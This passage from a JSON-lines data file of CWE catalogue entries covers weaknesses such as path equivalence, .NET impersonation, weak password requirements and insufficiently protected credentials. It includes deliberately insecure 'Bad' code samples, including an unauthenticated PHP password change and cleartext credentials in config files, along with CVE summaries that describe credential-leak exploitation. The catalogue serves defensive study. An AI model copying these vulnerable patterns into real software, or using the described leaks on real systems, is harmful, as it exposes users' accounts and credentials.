to ambiguities in the ICMP RFC, many IP implementations use the memory within the packet for storage or calculation. For this reason, certain fields of certain packets -- such as ICMP error packets which echo back parts of received messages -- may contain flaws or extra information which betrays information about the identity of the target operating system. This information is then used to build up evidence to decide the environment of the target. This is the first crucial step in determining if a given system is vulnerable to a particular flaw and what changes must be made to malicious code to mount a successful attack."}]}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}, "Notes": [{"Type": "Maintenance", "Note": "As of CWE 4.9, members of the CWE Hardware SIG are working to improve CWE's coverage of transient execution weaknesses, which include issues related to Spectre, Meltdown, and other attacks that create or exploit covert channels. As a result of that work, this entry might change in CWE 4.10."}]}
{"ID": "516", "Name": "DEPRECATED: Covert Timing Channel", "Abstraction": "Base", "Structure": "Simple", "Status": "Deprecated", "Description": "This weakness can be found at CWE-385.", "MappingNotes": {"Usage": "Prohibited", "Rationale": "This CWE has been deprecated.", "Comments": "See description and name for possible suggestions of other CWEs to consider.", "Reasons": ["Deprecated"]}}
{"ID": "52", "Name": "Path Equivalence: '/multiple/trailing/slash//'", "Abstraction": "Variant", "Structure": "Simple", "Status": "Incomplete", "Description": "The product accepts path input in the form of multiple trailing slash ('/multiple/trailing/slash//') without appropriate validation, which can lead to ambiguous path resolution and allow an attacker to traverse the file system to unintended locations or access arbitrary files.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "41", "ViewID": "1000", "Ordinal": "Primary"}, {"Nature": "ChildOf", "CweID": "163", "ViewID": "1000"}, {"Nature": "CanPrecede", "CweID": "289", "ViewID": "1000"}], "ApplicablePlatforms": [{"Type": "Language", "Class": "Not Language-Specific", "Prevalence": "Undetermined"}], "ModesOfIntroduction": [{"Phase": "Implementation"}], "CommonConsequences": [{"Scope": ["Confidentiality", "Integrity"], "Impact": ["Read Files or Directories", "Modify Files or Directories"]}], "PotentialMitigations": [{"MitigationID": "MIT-20", "Phase": ["Implementation"], "Strategy": "Input Validation", "Description": "Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked."}], "ObservedExamples": [{"Reference": "CVE-2002-1078", "Description": "Directory listings in web server using multiple trailing slash", "Link": "https://www.cve.org/CVERecord?id=CVE-2002-1078"}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "520", "Name": ".NET Misconfiguration: Use of Impersonation", "Abstraction": "Variant", "Structure": "Simple", "Status": "Incomplete", "Description": "Allowing a .NET application to run at potentially escalated levels of access to the underlying operating and file systems can be dangerous and result in various forms of attacks.", "ExtendedDescription": ".NET server applications can optionally execute using the identity of the user authenticated to the client. The intention of this functionality is to bypass authentication and access control checks within the .NET application code. Authentication is done by the underlying web server (Microsoft Internet Information Service IIS), which passes the authenticated token, or unauthenticated anonymous token, to the .NET application. Using the token to impersonate the client, the application then relies on the settings within the NTFS directories and files to control access. Impersonation enables the application, on the server running the .NET application, to both execute code and access resources in the context of the authenticated and authorized user.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "266", "ViewID": "1000", "Ordinal": "Primary"}], "ModesOfIntroduction": [{"Phase": "Architecture and Design"}, {"Phase": "Implementation"}, {"Phase": "Operation"}], "CommonConsequences": [{"Scope": ["Access Control"], "Impact": ["Gain Privileges or Assume Identity"]}], "PotentialMitigations": [{"Phase": ["Operation"], "Description": "Run the application with limited privilege to the underlying operating and file system."}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "521", "Name": "Weak Password Requirements", "Abstraction": "Base", "Structure": "Simple", "Status": "Draft", "Description": "The product does not require that users should have strong passwords, which makes it easier for attackers to compromise user accounts.", "ExtendedDescription": "Authentication mechanisms often rely on a memorized secret (also known as a password) to provide an assertion of identity for a user of a system. It is therefore important that this password be of sufficient complexity and impractical for an adversary to guess. The specific requirements around how complex a password needs to be depends on the type of system being protected. Selecting the correct password requirements and enforcing them through implementation are critical to the overall success of the authentication mechanism.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "1391", "ViewID": "1000", "Ordinal": "Primary"}, {"Nature": "ChildOf", "CweID": "287", "ViewID": "1003", "Ordinal": "Primary"}], "ApplicablePlatforms": [{"Type": "Language", "Class": "Not Language-Specific", "Prevalence": "Undetermined"}, {"Type": "Technology", "Class": "Not Technology-Specific", "Prevalence": "Undetermined"}], "ModesOfIntroduction": [{"Phase": "Architecture and Design", "Note": "COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic."}, {"Phase": "Implementation", "Note": "Not enforcing the password policy stated in a products design can allow users to create passwords that do not provide the necessary level of protection."}], "CommonConsequences": [{"Scope": ["Access Control"], "Impact": ["Gain Privileges or Assume Identity"], "Note": "An attacker could easily guess user passwords and gain access user accounts."}], "DetectionMethods": [{"DetectionMethodID": "DM-14", "Method": "Automated Static Analysis", "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)", "Effectiveness": "High"}], "PotentialMitigations": [{"Phase": ["Architecture and Design"], "Description": "\n\nA product's design should require adherance to an appropriate password policy. Specific password requirements depend strongly on contextual factors, but it is recommended to contain the following attributes:\n\n\n  - Enforcement of a minimum and maximum length\n\n  - Restrictions against password reuse\n\n  - Restrictions against using common passwords\n\n  - Restrictions against using contextual string in the password (e.g., user id, app name)\n\nDepending on the threat model, the password policy may include several additional attributes.\n\n  - Complex passwords requiring mixed character sets (alpha, numeric, special, mixed case) \n   - Increasing the range of characters makes the password harder to crack and may be appropriate for systems relying on single factor authentication.\n\n   - Unfortunately, a complex password may be difficult to memorize, encouraging a user to select a short password or to incorrectly manage the password (write it down).\n\n   - Another disadvantage of this approach is that it often does not result in a significant increases in overal password complexity due to people's predictable usage of various symbols.\n\n\n\n  1. Large Minimum Length (encouraging passphrases instead of passwords) \n   - Increasing the number of characters makes the password harder to crack and may be appropriate for systems relying on single factor authentication.\n\n   - A disadvantage of this approach is that selecting a good passphrase is not easy and poor passwords can still be generated. Some prompting may be needed to encourage long un-predictable passwords.\n\n\n\n  1. Randomly Chosen Secrets \n   - Generating a password for the user can help make sure that length and complexity requirements are met, and can result in secure passwords being used.\n\n   - A disadvantage of this approach is that the resulting password or passpharse may be too difficult to memorize, encouraging them to be written down.\n\n\n\n  1. Password Expiration \n   - Requiring a periodic password change can reduce the time window that an adversary has to crack a password, while also limiting the damage caused by password exposures at other locations.\n\n   - Password expiration may be a good mitigating technique when long complex passwords are not desired.\n\n\n\nSee NIST 800-63B [REF-1053] for further information on password requirements."}, {"Phase": ["Architecture and Design"], "Description": "Consider a second authentication factor beyond the password, which prevents the password from being a single point of failure. See CWE-308 for further information."}, {"Phase": ["Implementation"], "Description": "Consider implementing a password complexity meter to inform users when a chosen password meets the required attributes."}], "ObservedExamples": [{"Reference": "CVE-2020-4574", "Description": "key server application does not require strong passwords", "Link": "https://www.cve.org/CVERecord?id=CVE-2020-4574"}], "RelatedAttackPatterns": ["112", "16", "49", "509", "55", "555", "561", "565", "70"], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}, "Top25Examples": [{"Reference": "CVE-2021-36689", "Description": "An issue discovered in com.samourai.wallet.PinEntryActivity.java in Streetside Samourai Wallet 0.99.96i allows attackers to view sensitive information and decrypt data via a brute force attack that uses a recovered samourai.dat file. The PIN is 5 to 8 digits, which may be insufficient in this situation."}]}
{"ID": "522", "Name": "Insufficiently Protected Credentials", "Abstraction": "Class", "Structure": "Simple", "Status": "Incomplete", "Description": "The product transmits or stores authentication credentials, but it uses an insecure method that is susceptible to unauthorized interception and/or retrieval.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "1390", "ViewID": "1000", "Ordinal": "Primary"}, {"Nature": "ChildOf", "CweID": "287", "ViewID": "1003", "Ordinal": "Primary"}, {"Nature": "ChildOf", "CweID": "668", "ViewID": "1000"}], "ApplicablePlatforms": [{"Type": "Language", "Class": "Not Language-Specific", "Prevalence": "Undetermined"}, {"Type": "Technology", "Class": "ICS/OT", "Prevalence": "Undetermined"}], "ModesOfIntroduction": [{"Phase": "Architecture and Design", "Note": "COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic."}, {"Phase": "Implementation"}], "CommonConsequences": [{"Scope": ["Access Control"], "Impact": ["Gain Privileges or Assume Identity"], "Note": "An attacker could gain access to user accounts and access sensitive data used by the user accounts."}], "DetectionMethods": [{"DetectionMethodID": "DM-14", "Method": "Automated Static Analysis", "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)", "Effectiveness": "High"}], "PotentialMitigations": [{"Phase": ["Architecture and Design"], "Description": "Use an appropriate security mechanism to protect the credentials."}, {"Phase": ["Architecture and Design"], "Description": "Make appropriate use of cryptography to protect the credentials."}, {"Phase": ["Implementation"], "Description": "Use industry standards to protect the credentials (e.g. LDAP, keystore, etc.)."}], "DemonstrativeExamples": [{"ID": "DX-56", "Entries": [{"IntroText": "This code changes a user's password."}, {"Nature": "Bad", "Language": "PHP", "ExampleCode": "```\n\t$user = $_GET['user'];\n\t$pass = $_GET['pass'];\n\t$checkpass = $_GET['checkpass'];\n\tif ($pass == $checkpass) {\n\t\tSetUserPassword($user, $pass);\n\t}\n```"}, {"BodyText": "While the code confirms that the requesting user typed the same new password twice, it does not confirm that the user requesting the password change is the same user whose password will be changed. An attacker can request a change of another user's password and gain control of the victim's account."}]}, {"ID": "DX-57", "Entries": [{"IntroText": "The following code reads a password from a properties file and uses the password to connect to a database."}, {"Nature": "Bad", "Language": "Java", "ExampleCode": "```\n\t...\n\tProperties prop = new Properties();\n\tprop.load(new FileInputStream(\"config.properties\"));\n\tString password = prop.getProperty(\"password\");\n\tDriverManager.getConnection(url, usr, password);\n\t...\n```"}, {"BodyText": "This code will run successfully, but anyone who has access to config.properties can read the value of password. If a devious employee has access to this information, they can use it to break into the system."}]}, {"ID": "DX-58", "Entries": [{"IntroText": "The following code reads a password from the registry and uses the password to create a new network credential."}, {"Nature": "Bad", "Language": "Java", "ExampleCode": "```\n\t...\n\tString password = regKey.GetValue(passKey).toString();\n\tNetworkCredential netCred = new NetworkCredential(username,password,domain);\n\t...\n```"}, {"BodyText": "This code will run successfully, but anyone who has access to the registry key used to store the password can read the value of password. If a devious employee has access to this information, they can use it to break into the system"}]}, {"ID": "DX-59", "Entries": [{"IntroText": "Both of these examples verify a password by comparing it to a stored compressed version."}, {"Nature": "Bad", "Language": "C", "ExampleCode": "```\n\tint VerifyAdmin(char *password) {\n\t\tif (strcmp(compress(password), compressed_password)) {\n\t\t\tprintf(\"Incorrect Password!\\n\");\n\t\t\treturn(0);\n\t\t}\n\t\tprintf(\"Entering Diagnostic Mode...\\n\");\n\t\treturn(1);\n\t}\n```"}, {"Nature": "Bad", "Language": "Java", "ExampleCode": "```\n\tint VerifyAdmin(String password) {\n\t\tif (passwd.Equals(compress(password), compressed_password)) {\n\t\t\treturn(0);\n\t\t}\n```\n//Diagnostic Mode* \n\t\treturn(1);}"}, {"BodyText": "Because a compression algorithm is used instead of a one way hashing algorithm, an attacker can recover compressed passwords stored in the database."}]}, {"ID": "DX-43", "Entries": [{"IntroText": "The following examples show a portion of properties and configuration files for Java and ASP.NET applications. The files include username and password information but they are stored in cleartext."}, {"BodyText": "This Java example shows a properties file with a cleartext username / password pair."}, {"Nature": "Bad", "Language": "Java", "ExampleCode": "```\n```\n# Java Web App ResourceBundle properties file* \n\t...\n\twebapp.ldap.username=secretUsername\n\twebapp.ldap.password=secretPassword\n\t..."}, {"BodyText": "The following example shows a portion of a configuration file for an ASP.Net application. This configuration file includes username and password information for a connection to a database but the pair is stored in cleartext."}, {"Nature": "Bad", "Language": "ASP.NET", "ExampleCode": "```\n\t...\n\t<connectionStrings>\n\t\t<add name=\"ud_DEV\" connectionString=\"connectDB=uDB; uid=db2admin; pwd=password; dbalias=uDB;\" providerName=\"System.Data.Odbc\" />\n\t</connectionStrings>\n\t...\n```"}, {"BodyText": "Username and password information should not be included in a configuration file or a properties file in cleartext as this will allow anyone who can read the file access to the resource. If possible, encrypt this information."}]}, {"ID": "DX-153", "Entries": [{"IntroText": "In 2022, the OT:ICEFALL study examined products by 10 different Operational Technology (OT) vendors. The researchers reported 56 vulnerabilities and said that the products were \"insecure by design\" [REF-1283]. If exploited, these vulnerabilities often allowed adversaries to change how the products operated, ranging from denial of service to changing the code that the products executed. Since these products were often used in industries such as power, electrical, water, and others, there could even be safety implications."}, {"BodyText": "Multiple vendors used cleartext transmission or storage of passwords in their OT products."}]}], "ObservedExamples": [{"Reference": "CVE-2022-30018", "Description": "A messaging platform serializes all elements of User/Group objects, making private information available to adversaries", "Link": "https://www.cve.org/CVERecord?id=CVE-2022-30018"}, {"Reference": "CVE-2022-29959", "Description": "Initialization file contains credentials that can be decoded using a \"simple string transformation\"", "Link": "https://www.cve.org/CVERecord?id=CVE-2022-29959"}, {"Reference": "CVE-2022-35411", "Description": "Python-based RPC framework enables pickle functionality by default, allowing clients to unpickle untrusted data.", "Link": "https://www.cve.org/CVERecord?id=CVE-2022-35411"}, {"Reference": "CVE-2022-29519", "Description": "Programmable Logic Controller (PLC) sends sensitive information in plaintext, including passwords and session tokens.", "Link": "https://www.cve.org/CVERecord?id=CVE-2022-29519"}, {"Reference": "CVE-2022-30312", "Description": "Building Controller uses a protocol that transmits authentication credentials in plaintext.", "Link": "https://www.cve.org/CVERecord?id=CVE-2022-30312"}, {"Reference": "CVE-2022-31204", "Description": "Programmable Logic Controller (PLC) sends password in plaintext.", "Link": "https://www.cve.org/CVERecord?id=CVE-2022-31204"}, {"Reference": "CVE-2022-30275", "Description": "Remote Terminal Unit (RTU) uses a driver that relies on a password stored in plaintext.", "Link": "https://www.cve.org/CVERecord?id=CVE-2022-30275"}, {"Reference": "CVE-2007-0681", "Description": "Web app allows remote attackers to change the passwords of arbitrary users without providing the original password, and possibly perform other unauthorized actions.", "Link": "https://www.cve.org/CVERecord?id=CVE-2007-0681"}, {"Reference": "CVE-2000-0944", "Description": "Web application password change utility doesn't check the original password.", "Link": "https://www.cve.org/CVERecord?id=CVE-2000-0944"}, {"Reference": "CVE-2005-3435", "Description": "product authentication succeeds if user-provided MD5 hash matches the hash in its database; this can be subjected to replay attacks.", "Link": "https://www.cve.org/CVERecord?id=CVE-2005-3435"}, {"Reference": "CVE-2005-0408", "Description": "chain: product generates predictable MD5 hashes using a constant value combined with username, allowing authentication bypass.", "Link": "https://www.cve.org/CVERecord?id=CVE-2005-0408"}], "RelatedAttackPatterns": ["102", "474", "50", "509", "551", "555", "560", "561", "600", "644", "645", "652", "653"], "MappingNotes": {"Usage": "Allowed-with-Review", "Rationale": "This CWE entry is a Class and might have Base-level children that would be more appropriate", "Comments": "Examine children of this entry to see if there is a better fit", "Reasons": ["Abstraction"]}, "Top25Examples": [{"Reference": "CVE-2022-37783", "Description": "All Craft CMS versions between 3.0.0 and 3.7.32 disclose password hashes of users who authenticate using their E-Mail address or username in Anti-CSRF-Tokens. Craft CMS uses a cookie called CRAFT_CSRF_TOKEN and a HTML hidden field called CRAFT_CSRF_TOKEN to avoid Cross Site Request Forgery attacks. The CRAFT_CSRF_TOKEN cookie discloses the password hash in without encoding it whereas the corresponding HTML hidden field discloses the users' password hash in a masked manner, which can be decoded by using public functions of the YII framework."}, {"Reference": "CVE-2021-30116", "Description": "Kaseya VSA before 9.5.7 allows credential disclosure, as exploited in the wild in July 2021. By default Kaseya VSA on premise offers a download page where the clients for the installation can be downloaded. The default URL for this page is https://x.x.x.x/dl.asp When an attacker download a client for Windows and installs it, the file KaseyaD.ini is generated (C:\\\\Program Files (x86)\\\\Kaseya\\\\XXXXXXXXXX\\\\KaseyaD.ini) which contains an Agent_Guid and AgentPassword This Agent_Guid and AgentPassword can be used to log in on dl.asp (https://x.x.x.x/dl.asp?un=840997037507813&pw=113cc622839a4077a84837485ced6b93e440bf66d44057713cb2f95e503a06d9) This request authenticates the client and returns a sessionId cookie that can be used in subsequent attacks to bypass authentication. Security issues discovered --- * Unauthenticated download page leaks credentials * Credentials of agent software can be used to obtain a sessionId (cookie) that can be used for services not intended for use by agents * dl.asp accepts credentials via a GET request * Access to KaseyaD.ini gives an attacker access to sufficient information to penetrate the Kaseya installation and its clients. Impact --- Via the page /dl.asp enough information can be obtained to give an attacker a sessionId that can be used to execute further (semi-authenticated) attacks against the system."}, {"Reference": "CVE-2022-37193", "Description": "Chipolo ONE Bluetooth tracker (2020) Chipolo iOS app version 4.13.0 is vulnerable to Incorrect Access Control. Chipolo devices suffer from access revocation evasion attacks once the malicious sharee obtains the access credentials."}, {"Reference": "CVE-2021-36204", "Description": "Under some circumstances an Insufficiently Protected Credentials vulnerability in Johnson Controls Metasys ADS/ADX/OAS 10 versions prior to 10.1.6 and 11 versions prior to 11.0.3 allows API calls to expose credentials in plain text."}, {"Reference": "CVE-2021-40360", "Description": "A vulnerability has been identified in SIMATIC PCS 7 V8.2 (All versions), SIMATIC PCS 7 V9.0 (All versions), SIMATIC PCS 7 V9.1 (All versions < V9.1 SP1), SIMATIC WinCC V15 and earlier (All versions < V15 SP1 Update 7), SIMATIC WinCC V16 (All versions < V16 Update 5), SIMATIC WinCC V17 (All versions < V17 Update 2), SIMATIC WinCC V7.4 (All versions < V7.4 SP1 Update 19), SIMATIC WinCC V7.5 (All versions < V7.5 SP2 Update 6). The password hash of a local user account in the remote server could be granted via public API to a user on the affected system. An authenticated attacker could brute force the password hash and use it to login to the server."}, {"Reference": "CVE-2022-0019", "Description": "An insufficiently protected credentials vulnerability exists in the Palo Alto Networks GlobalProtect app on Linux that exposes the hashed credentials of GlobalProtect users that saved their password during previous GlobalProtect app sessions to other local users on the system. The exposed credentials enable a local attacker to authenticate to the GlobalProtect portal or gateway as the target user without knowing of the target user\u2019s plaintext password. This issue impacts: GlobalProtect app 5.1 versions earlier than GlobalProtect app 5.1.10 on Linux. GlobalProtect app 5.2 versions earlier than and including GlobalProtect app 5.2.7 on Linux. GlobalProtect app 5.3 versions earlier than GlobalProtect app 5.3.2 on Linux. This issue does not affect the GlobalProtect app on other platforms."}, {"Reference": "CVE-2022-0021", "Description": "An information exposure through log file vulnerability exists in the Palo Alto Networks GlobalProtect app on Windows that logs the cleartext credentials of the connecting GlobalProtect user when authenticating using Connect Before Logon feature. This issue impacts GlobalProtect App 5.2 versions earlier than 5.2.9 on Windows. This issue does not affect the GlobalProtect app on other platforms."}, {"Reference": "CVE-2022-0718", "Description": "A flaw was found in python-oslo-utils. Due to improper parsing, passwords with a double quote ( \" ) in them cause incorrect masking in debug logs, causing any part of the password after the double quote to be plaintext."}, {"Reference": "CVE-2022-0725", "Description": "A flaw was found in keepass. The vulnerability occurs due to logging the plain text passwords in system log and leads to an Information Exposure vulnerability. This flaw allows an attacker to interact and read sensitive passwords and logs."}, {"Reference": "CVE-2022-27544", "Description": "BigFix Web Reports authorized users may see SMTP credentials in clear text."}, {"Reference": "CVE-2022-37401", "Description": "Apache OpenOffice supports the storage of passwords for web connections in the user's configuration database. The stored passwords are encrypted with a single master key provided by the user. A flaw in OpenOffice existed where master key was poorly encoded resulting in weakening its entropy from 128 to 43 bits making the stored passwords vulnerable to a brute force attack if an attacker has access to the users stored config. This issue affects: Apache OpenOffice versions prior to 4.1.13. Reference: CVE-2022-26307 - LibreOffice"}, {"Reference": "CVE-2022-45423", "Description": "Some Dahua software products have a vulnerability of unauthenticated request of MQTT credentials. An attacker can obtain encrypted MQTT credentials by sending a specific crafted packet to the vulnerable interface (the credentials cannot be directly exploited)."}, {"Reference": "CVE-2022-45424", "Description": "Some Dahua software products have a vulnerability of unauthenticated request of AES crypto key. An attacker can obtain the AES crypto key by sending a specific crafted packet to the vulnerable interface."}, {"Reference": "CVE-2022-45877", "Description": "OpenHarmony-v3.1.4 and prior versions had an vulnerability. PIN code is transmitted to the peer device in plain text during cross-device authentication, which reduces the difficulty of man-in-the-middle attacks."}, {"Reference": "CVE-2021-27785", "Description": "HCL Commerce's Remote Store server could allow a local attacker to obtain sensitive personal information. The vulnerability requires the victim to first perform a particular operation on the website."}, {"Reference": "CVE-2022-27218", "Description": "Jenkins incapptic connect uploader Plugin 1.15 and earlier stores tokens unencrypted in job config.xml files on the Jenkins controller where they can be viewed by users with Extended Read permission, or access to the Jenkins controller file system."}, {"Reference": "CVE-2022-28291", "Description": "Insufficiently Protected Credentials: An authenticated user with debug privileges can retrieve stored Nessus policy credentials from the \u201cnessusd\u201d process in cleartext via process dumping. The affected products are all versions of Nessus Essentials and Professional. The vulnerability allows an attacker to access credentials stored in Nessus scanners, potentially compromising its customers\u2019 network of assets."}, {"Reference": "CVE-2022-34803", "Description": "Jenkins OpsGenie Plugin 1.9 and earlier stores API keys unencrypted in its global configuration file and in job config.xml files on the Jenkins controller where they can be viewed by users with Extended Read permission (config.xml), or access to the Jenkins controller file system."}, {"Reference": "CVE-2022-34808", "Description": "Jenkins Cisco Spark Plugin 1.1.1 and earlier stores bearer tokens unencrypted in its global configuration file on the Jenkins controller where they can be viewed by users with access to the Jenkins controller file system."}, {"Reference": "CVE-2022-36308", "Description": "Airspan AirVelocity 1500 web management UI displays SNMP credentials in plaintext on software versions older than 15.18.00.2511, and stores SNMPv3 credentials unhashed on the filesystem, enabling anyone with web access to use these credentials to manipulate the eNodeB over SNMP. This issue may affect other AirVelocity and AirSpeed models."}, {"Reference": "CVE-2022-3644", "Description": "The collection remote for pulp_ansible stores tokens in plaintext instead of using pulp's encrypted field and exposes them in read/write mode via the API () instead of marking it as write only."}, {"Reference": "CVE-2022-36617", "Description": "Arq Backup 7.19.5.0 and below stores backup encryption passwords using reversible encryption. This issue allows attackers with administrative privileges to recover cleartext passwords."}, {"Reference": "CVE-2022-41255", "Description": "Jenkins CONS3RT Plugin 1.0.0 and earlier stores Cons3rt API token unencrypted in job config.xml files on the Jenkins controller where it can be viewed by users with access to the Jenkins controller file system."}, {"Reference": "CVE-2022-20621", "Description": "Jenkins Metrics Plugin 4.0.2.8 and earlier stores an access key unencrypted in its global configuration file on the Jenkins controller where it can be viewed by users with access to the Jenkins controller file system."}, {"Reference": "CVE-2022-2818", "Description": "Improper Removal of Sensitive Information Before Storage or Transfer in GitHub repository cockpit-hq/cockpit prior to 2.2.2. "}, {"Reference": "CVE-2021-39045", "Description": "IBM Cognos Analytics 11.1.7, 11.2.0, and 11.2.1 could allow a local attacker to obtain information due to the autocomplete feature on password input fields. IBM X-Force ID: 214345."}, {"Reference": "CVE-2021-45097", "Description": "KNIME Server before 4.12.6 and 4.13.x before 4.13.4 (when installed in unattended mode) keeps the administrator's password in a file without appropriate file access controls, allowing all local users to read its content."}, {"Reference": "CVE-2022-30944", "Description": "Insufficiently protected credentials for Intel(R) AMT and Intel(R) Standard Manageability may allow a privileged user to potentially enable information disclosure via local access."}, {"Reference": "CVE-2022-30952", "Description": "Jenkins Pipeline SCM API for Blue Ocean Plugin 1.25.3 and earlier allows attackers with Job/Configure permission to access credentials with attacker-specified IDs stored in the private per-user credentials stores of any attacker-specified user in Jenkins."}, {"Reference": "CVE-2022-32518", "Description": "A CWE-522: Insufficiently Protected Credentials vulnerability exists that could result in unwanted access to a DCE instance when performed over a network by a malicious third-party. This CVE is unique from CVE-2022-32520. Affected Products: Data Center Expert (Versions prior to V7.9.0)"}, {"Reference": "CVE-2022-32520", "Description": "A CWE-522: Insufficiently Protected Credentials vulnerability exists that could result in unwanted access to a DCE instance when performed over a network by a malicious third-party. This CVE is unique from CVE-2022-32518. Affected Products: Data Center Expert (Versions prior to V7.9.0)"}, {"Reference": "CVE-2022-33169", "Description": "IBM Robotic Process Automation 21.0.0, 21.0.1, and 21.0.2 is vulnerable to insufficiently protected credentials for users created via a bulk upload. IBM X-Force ID: 228888."}, {"Reference": "CVE-2022-33953", "Description": "IBM Robotic Process Automation 21.0.1 and 21.0.2 could allow a user with psychical access to the system to obtain sensitive information due to insufficiently protected access tokens. IBM X-Force ID: 229198."}, {"Reference": "CVE-2022-3474", "Description": "A bad credential handling in the remote assets API for Bazel versions prior to 5.3.2 and 4.2.3 sends all user-provided credentials instead of only the required ones for the requests. We recommend upgrading to versions later than or equal to 5.3.2 or 4.2.3."}, {"Reference": "CVE-2022-36307", "Description": "The AirVelocity 1500 prints SNMP credentials on its physically accessible serial port during boot. This was fixed in AirVelocity 1500 software version 15.18.00.2511 and may affect other AirVelocity and AirSpeed models."}, {"Reference": "CVE-2022-38465", "Description": "A vulnerability has been identified in SIMATIC Drive Controller family (All versions < V2.9.2), SIMATIC ET 200SP Open Controller CPU 1515SP PC (incl. SIPLUS variants) (All versions), SIMATIC ET 200SP Open Controller CPU 1515SP PC2 (incl. SIPLUS variants) (All versions < V21.9), SIMATIC S7-1200 CPU family (incl. SIPLUS variants) (All versions < V4.5.0), SIMATIC S7-1500 CPU family (incl. related ET200 CPUs and SIPLUS variants) (All versions < V2.9.2), SIMATIC S7-1500 Software Controller (All versions < V21.9), SIMATIC S7-PLCSIM Advanced (All versions < V4.0), SINUMERIK MC (All versions < V6.21), SINUMERIK ONE (All versions < V6.21). Affected products protect the built-in global private key in a way that cannot be considered sufficient any longer. The key is used for the legacy protection of confidential configuration data and the legacy PG/PC and HMI communication. This could allow attackers to discover the private key of a CPU product family by an offline attack against a single CPU of the family. Attackers could then use this knowledge to extract confidential configuration data from projects that are protected by that key or to perform attacks against legacy PG/PC and HMI communication."}, {"Reference": "CVE-2022-40678", "Description": "An insufficiently protected credentials in Fortinet FortiNAC versions 9.4.0, 9.2.0 through 9.2.5, 9.1.0 through 9.1.7, 8.8.0 through 8.8.11, 8.7.0 through 8.7.6, 8.6.0 through 8.6.5, 8.5.0 through 8.5.4, 8.3.7 may allow a local attacker with database access to recover user passwords."}, {"Reference": "CVE-2022-40751", "Description": " IBM UrbanCode Deploy (UCD) 6.2.7.0 through 6.2.7.17, 7.0.0.0 through 7.0.5.12, 7.1.0.0 through 7.1.2.8, and 7.2.0.0 through 7.2.3.1 could allow a user with administrative privileges including \"Manage Security\" permissions may be able to recover a credential previously saved for performing authenticated LDAP searches. IBM X-Force ID: 236601."}, {"Reference": "CVE-2022-41614", "Description": "Insufficiently protected credentials in the Intel(R) ON Event Series Android application before version 2.0 may allow an authenticated user to potentially enable information disclosure via local access."}, {"Reference": "CVE-2022-4612", "Description": "A vulnerability has been found in Click Studios Passwordstate and Passwordstate Browser Extension Chrome and classified as problematic. This vulnerability affects unknown code. The manipulation leads to insufficiently protected credentials. The attack can be initiated remotely. The exploit has been disclosed to the public and may be used. It is recommended to upgrade the affected component. VDB-216274 is the identifier assigned to this vulnerability."}, {"Reference": "CVE-2022-47703", "Description": "TIANJIE CPE906-3 is vulnerable to password disclosure. This is present on Software Version WEB5.0_LCD_20200513, Firmware Version MV8.003, and Hardware Version CPF906-V5.0_LCD_20200513."}, {"Reference": "CVE-2022-4693", "Description": "The User Verification WordPress plugin before 1.0.94 was affected by an Auth Bypass security vulnerability. To bypass authentication, we only need to know the user\u2019s username. Depending on whose username we know, which can be easily queried because it is usually public data, we may even be given an administrative role on the website."}, {"Reference": "CVE-2021-22923", "Description": "When curl is instructed to get content using the metalink feature, and a user name and password are used to download the metalink XML file, those same credentials are then subsequently passed on to each of the servers from which curl will download or try to download the contents from. Often contrary to the user's expectations and intentions and without telling the user it happened."}, {"Reference": "CVE-2022-0184", "Description": "Insufficiently protected credentials vulnerability in 'TEPRA' PRO SR5900P Ver.1.080 and earlier and 'TEPRA' PRO SR-R7900P Ver.1.030 and earlier allows an attacker on the adjacent network to obtain credentials for connecting to the Wi-Fi access point with the infrastructure mode."}, {"Reference": "CVE-2022-0738", "Description": "An issue has been discovered in GitLab affecting all versions starting from 14.6 before 14.6.5, all versions starting from 14.7 before 14.7.4, all versions starting from 14.8 before 14.8.2. GitLab was leaking user passwords when adding mirrors with SSH credentials under specific conditions."}, {"Reference": "CVE-2022-0859", "Description": "McAfee Enterprise ePolicy Orchestrator (ePO) prior to 5.10 Update 13 allows a local attacker to point an ePO server to an arbitrary SQL server during the restoration of the ePO server. To achieve this the attacker would have to be logged onto the server hosting the ePO server (restricted to administrators) and to know the SQL server password."}, {"Reference": "CVE-2022-1026", "Description": 